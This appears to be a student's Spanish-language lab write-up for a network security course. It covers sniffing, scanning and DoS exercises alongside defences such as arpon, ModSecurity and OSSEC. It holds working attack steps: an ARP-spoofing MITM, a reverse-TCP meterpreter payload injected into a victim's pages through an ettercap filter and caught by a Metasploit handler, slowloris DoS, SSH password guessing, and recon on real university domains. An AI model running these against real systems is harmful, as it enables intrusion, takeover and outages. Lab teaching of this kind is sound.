# PRÁCTICA 2 - EJEMPLOS DE CATEGORÍAS DE ATAQUE ET AL
## APARTADO A
Instale el ettercap y pruebe sus opciones básicas en línea de comando.
> `apt install ettercap-text-only`
## APARTADO B
Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados).
1. Hacemos un MITM a la máquina de nuestro compañero:
> `ettercap -T -q -i ens33 -M arp:remote //10.11.49.55/ //10.11.48.1/`
- Para generar trafico se puede usar el siguiente comando: `xdg-open http://www.edu4java.com/es/web/web30.html`.
2. En otra terminal, hacemos un tcpdump para guardar el tráfico capturado en un fichero `pcap``:
> `tcpdump -i ens33 -s 65535 -w compa.pcap`
3. Desde nuestra máquina local, hacemos un `scp` para obtener el fichero:
> `scp lsi@10.11.49.54:/home/lsi/compa.pcap .`
4. Ejecutamos Wireshark y abrimos el archivo compa.pcap para comenzar a analizar.

### APARTADOS COMPLEMENTARIOS
- Filtre la captura para obtener el tráfico HTTP.
> Escribir en la barra de filtrado.

- Visualice la paquetería TCP de una determinada sesión.
> Ir a `Analyze > Follow > TCP Stream`.

- Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico sobre el tráfico.
> Ir a `Statistics > Protocol Hierarchy`.

- Obtenga información del tráfico de las distintas "conversaciones" mantenidas.
> Ir a `Statistics > Conversations`.

- Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.
> Ir a `Statistics > Endpoints`.

## APARTADO C
Obtenga la relación de las direcciones MAC de los equipos de su segmento.
> `nmap -sP 10.11.48.0/23`

## APARTADO D
Obtenga la relación de las direcciones IPv6 de su segmento.
```bash
#!/bin/bash

# Paso 1: Generar direcciones IPv4 y guardarlas en un archivo
seq -f "10.11.49.%g" 1 254 > ipv4_addresses.txt

# Paso 2: Convertir las direcciones IPv4 a IPv6 y guardarlas en otro archivo
while read -r ipv4; do

    ipv6="2002:$(printf "%02x%02x:%02x%02x" $(echo $ipv4 | tr '.' ' '))"
    ipv6="$ipv6::1"
    echo "$ipv6" >> ipv6_addresses.txt
done < ipv4_addresses.txt


# Paso 3: Escanear todas las direcciones IPv6 simultáneamente
nmap -6 -sn -iL ipv6_addresses.txt

# Limpiar archivos temporales
rm ipv4_addresses.txt
rm ipv6_addresses.txt
```
> [!Warning]
> Esta linea de comandos está obsoleta: `ping6 -c2 -I ens33 ff02::1`

## APARTADO E
> [!Warning]
> No estoy seguro de haber hecho este apartado, pero parece ser repetido.

Obtenga el tráfico de entrada y salida legítimo de su interface de red `ens33` e investigue los servicios, conexiones y protocolos involucrados.
> `tcpdump -i ens33 -s 65535 -w my.pcap`

## APARTADO F
> [!Warning]
> No estoy seguro de haber hecho este apartado, pero parece ser repetido.

Mediante `arpspoofing` entre una máquina objeto (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.
- Utilizamos el archivo `pcap` obtenido de la máquina de nuestro compañero.

Se puede ver en *Statistics > HTTP > Requests*

## APARTADO G
Instale *Metasploit*. Haga un ejecutable que incluya Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.
1. Instalamos *Metasplot* siguiente [este tutorial](https://computingforgeeks.com/install-metasploit-framework-on-debian/).
2. Creamos payload:
> `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.48.51 LPORT=5555 -f elf > payload.bin`

> :question: No entiendo que quieres decir a continuación:

3. Lo mejor es subir el payload a tu servidor de apache, mueve el archivo con

> cp payload.bin /var/www/html/

5. Creamos `ett.filter`:
> `nano ett.filter`
```bash
if (ip.proto == TCP && tcp.src == 80) {
	replace("a href", "a href=\"http://10.11.49.54/payload.bin\">");
	msg("replaced href.\n");
}
```
5. Configuramos:
> `etterfilter ett.filter -o ig.ef`

6. Activamos el ip_forwarding
> `echo 1 > /proc/sys/net/ipv4/ip_forward`

7. Encendemos el ettercap con el filtro:
> `ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.49.55/ //10.11.48.1/`

- Llegados a este punto, desde el cliente vemos la pagina y nos descargamos el virus:
>  `lynx http://example.org`

Podemos hacer tambien un curl, y descargar el link del payload con wget

1. Damos permisos de ejecucion 
> `chmod +x payload.bin`

2. Ejecutamos el virus
> `./payload.bin`

- Finalmente desde el atacante entramos en la consola de metasploit:
> `msfconsole`
```bash
use multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.11.48.51
set LPORT 5555
set ExitOnSession false
exploit -j -z
```
Ahora estamos dentro del cliente desde el atacante.
> [!Note]
> Para salir podemos usar: `msf6 exploit(multi/handler) > exit -y`


## APARTADO H
Haga un MITM en IPv6 y visualice la paquetería.
> `ettercap -6 -T -q -i ens33 -M arp:remote //2002:a0b:3136::1/ //::10.11.48.1/`

> [!Note]
> El resto funciona como el [segundo apartado](https://github.com/Meleagrista/legislacion-seguridad-informatica/edit/main/practica-2/p2-defensa.md#apartado-b).

## APARTADO I
Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).
> `apt install arpon`
- Para vaciar la tabla arp: `ip -s -s neigh flush all`
> `nano /etc/arpon.conf`
```bash
#
# ArpON configuration file.
#
# See the arpon(8) man page for details.
#
#
# Static entries matching the ens33 network interface:
#
10.11.48.1	    dc:08:56:10:84:b9
10.11.49.51	    00:50:56:97:24:d0
```
- Para saber la dirección mac: `ip addr show`
> `arpon -d -i ens33 -H`

> [!Note]
> Para cerrar los procesos de arpon usar `ps -A | grep arpon` y luego `kill <process>`.

> [!Note]
> Tras instalar `arpon` es necesario deshabilitarlo para que no se inicie en boot.

Como medida de seguridad es recomendable usar `shutdown -r +10` para programar un reinicio mientras se trabaja con `arpon` para evitar quedarte fuera.
> [!Warning]
> Si no está desahabilitado esto es inutil.

Es necesario usar el comando `kill` para cerrarlo, y despues siempre maskearlo, si no desinstalarlo, cuando dejes de usarlo.

## APARTADO J
Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre la máquinas del laboratorio de prácticas en IPv4.
> `nmap -A 10.11.48.0/23 > nmap_full.txt`

> [!Note]
> Puede ser increiblemente lento, es recomendable usarlo en ips individuales.

### CONTINUACIÓN DEL APARTADO
1. Realice alguna de las pruebas de port scanning sobre IPv6.
> `nmap -A -6 2002:a0b:3137::1`

2. ¿Coinciden los servicios prestados por un sistema con los de IPv4?
> `nmap -A 10.11.49.54`

## APARTADO K
Obtenga información "en tiempo real" sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.
> `apt-get install iftop`

> `iftop -i ens33`

> `apt-get install vnstat`

> `vnstat -l -i ens33`

## APARTADO L
Monitoremos nuestra infraestructura:
1. Instale `prometheus` y `node_exporter` y configurelos para recopliar todo tipo de métricas de su maquina linux.
2. Posteriormente instale `grafana` y agregue como fuente de datos las métricas de su equipo de prometheus.
3. Importe vía grafana el dashboard 1860.
4. En los ataques de los apartados m y n busque posibles alteraciones en las metricas visualizadas.

> [!Note]
> Para instalar Firewalld, visitar [esta pagina](https://computingforgeeks.com/how-to-install-and-configure-firewalld-on-debian/).

Para instalar todos los programas seguir [este tutorial](https://medium.com/@ismaelaguilera_/instalación-y-configuración-de-prometheus-grafana-centos8-331c0e43ccc1).

## APARTADO M
1. ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas?
> ...

2. ¿Y mediante un DoS de tipo reflective flooding attack?
> ...

## APARTADO N
Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7).
> `apt install apache2`

> `curl https://www.alvarofreire.es/ > /var/www/html/index.html`

#### 1. Slowhttptest
> `slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.49.54 -x 24 -p 3`

#### 2. Apache benchmarking
> `ab -n 10000 -c 10000 http://10.11.49.55/`

#### 3. Slowloris Python
> `git clone https://github.com/gkbrk/slowloris.git`

> `cd slowloris`

> `python3 slowloris.py 10.11.49.55 -s 500`

#### 4. Slowlori Perl

Crear archivo `slowlorys.pl` y copiar contenido de [aqui](https://github.com/GHubgenius/slowloris.pl/blob/master/slowloris.pl)
> `perl slowloris.pl -dns 10.11.49.55`

1. ¿Cómo podría proteger dicho servicio ante este tipo de ataque?
> Con un firewall de aplicaciones web como modsecurity.
2. ¿Y si se produjese desde fuera de su segmento de red?
> ...
3. ¿Cómo podría tratar de saltarse dicha protección?
> ...

## APARTADO O
Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?
> [!Note]
> Para ver la lista de modulos activos usar `apachectl -M`.

> `apt install libapache2-mod-security2`

> `a2enmod headers`

> `systemctl restart apache2`

> `cp /etc/modsecurity/modsecurity.conf-recommended app`

> `cat app`

> `nano /etc/modsecurity/modsecurity.conf`
```bash
SecRuleEngine On

SecConnEngine On 

SecConnReadStateLimit 10

SecConnWriteStateLimit 10
```
> `apt install libapache2-mod-evasive`

> `a2enmod evasive`

> `nano /etc/apache2/mods-enabled/evasive.conf`
```bash
<IfModule mod_evasive20.c>
    #DOSHashTableSize    3097
    DOSPageCount        1
    DOSSiteCount        1
    
    DOSPageInterval     1
    DOSSiteInterval     2
    
    DOSBlockingPeriod   300

    #DOSEmailNotify      you@yourdomain.com
    #DOSSystemCommand    "su - someuser -c '/sbin/... %s ...'"
    #DOSLogDir           "/var/log/mod_evasive"
</IfModule>
```
> `wget http://ftp.us.debian.org/debian/pool/main/liba/libapache2-mod-qos/libapache2-mod-qos_11.74-1+b1_amd64.deb`

> `dpkg -i libapache2-mod-qos_11.74-1+b1_amd64.deb`

> [!Note]
> Se puede modificar el `qos.conf` para aplicar las reglas.

### OWASP ModSecurity Core Rule Set
The OWASP ModSecurity Core Rule Set (CRS) is a set of generic attack detection rules for use with ModSecurity or compatible web application firewalls. The CRS aims to protect web applications from a wide range of attacks, including the OWASP Top Ten, with a minimum of false alerts. The CRS provides protection against many common attack categories, including SQL Injection, Cross Site Scripting, and Local File Inclusion.

1. Elimina el conjunto de reglas actual que viene preempaquetado con ModSecurity ejecutando el siguiente comando:
> `rm -rf /usr/share/modsecurity-crs`

2. Asegúrate de que git esté instalado:
> `apt install git`

3. Clona el repositorio de GitHub de OWASP-CRS en el directorio /usr/share/modsecurity-crs:
> `git clone https://github.com/coreruleset/coreruleset /usr/share/modsecurity-crs`

4. Renombra el archivo crs-setup.conf.example a crs-setup.conf:
> `mv /usr/share/modsecurity-crs/crs-setup.conf.example /usr/share/modsecurity-crs/crs-setup.conf`

5. Renombra el archivo de reglas de exclusión de solicitudes predetermined:
> `mv /usr/share/modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example /usr/share/modsecurity-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf`

## APARTADO P
1. Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.
> `whois -h whois.ripe.net UDC`

> [!Warning]
> Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.

2. Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.
> `apt install bind-utils`

> `dig udc.es MX`

> [!Warning]
> Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.

3. ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?
- No, tiene la transferencia de zona deshabilitada:
> `dig axfr @zipi.udc.es udc.es.`

> [!Warning]
> Desde la maquina virtual no funcionan esta serie de comandos, hay que hacerlos desde nuestra maquina local.

4. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.
> `nmap --script hostmap-crtsh.nse udc.es`

5. ¿Qué gestor de contenidos se utiliza en www.usc.es?
> `apt-get install whatweb`

> `whatweb www.usc.es`

## APARTADO Q
Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.
1. Para hacer OS fingerprinting: `nmap -O --osscan-guess`
2. Para hacer port scanning: `nmap -sV`

## APARTADO R
Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.
> `apt-get install medusa`

- El archivo exacto se puede encontrar [aquí](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt).
> `scp .\10k-most-common.txt lsi@10.11.49.54:/home/lsi`

Después de añadir la contraseña correcta continuamos...
> `medusa -h 10.11.49.54 -u lsi -P 10k-most-common.txt -M ssh`

## APARTADO S
Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.
> `apt -y install  wget git vim unzip make gcc build-essential php php-cli php-common libapache2-mod-php apache2-utils inotify-tools libpcre2-dev zlib1g-dev  libz-dev libssl-dev libevent-dev build-essential libsystemd-dev`

> `wget https://github.com/ossec/ossec-hids/archive/refs/tags/3.7.0.zip`

> `mv 3.7.0.zip  ossec-hids-3.7.0.zip`

> `unzip ossec-hids-3.7.0.zip`

> `cd ossec-hids-3.7.0`

> `./install.sh`

> `wget -q -O - https://updates.atomicorp.com/installers/atomic | sudo bash`

> `apt-get install ossec-hids-agent`

> [!Note]
> Si no se encuentra el paquete, probar a usar: `apt-get update`

> `apt-get install ossec-hids-server`

> `/var/ossec/bin/manage_agents`

> `/var/ossec/bin/ossec-control start`

Para más información sobre la instalación se puede consultar la [siguiente página](https://www.ossec.net/docs/docs/manual/installation/installation-requirements.html) para ver los requisitos de instalación y la [siguiente página](https://www.ossec.net/download-ossec/) para ver los métodos de instalación.

### Consejos
1. Para desbanear la ip de la maquina atacante podemos usar los siguientes comandos:
> `/var/ossec/active-response/bin/host-deny.sh delete - 10.11.49.55` <- `cat /etc/hosts.deny`
> `iptables -D INPUT -s 10.11.49.55 -j DROP <- `iptables -L`

> [!Warning]
> El segundo comando puede dar errores. Si se queda pillado borrar el archivo `fw-drop` o en la carpeta principal o en `/var/ossec/active-response/bin/`.

2. Los registros (logs) se pueden ver de la siguiente manera:
> `tail /var/ossec/logs/ossec.log` 

> `tail /var/ossec/logs/active-responses.log`

## APARTADO T
Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.
> `cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a`

> `cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a |/var/ossec/bin/ossec-reportd`

Mi propio codigo para ver los errores por orden es:
```bash
command_to_generate_output="cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a"

(eval "$command_to_generate_output") >> ossec_output.txt

awk '/\(level [0-9]+\)/ {print a[NR-2] "---" a[NR-1] "---" $0 "---" ; next} {a[NR]=$0}' ossec_output.txt | awk -F"\\(level |\\)" '{print "Level: " $2 "---" $0}' | sort>

rm ossec_output.txt
```
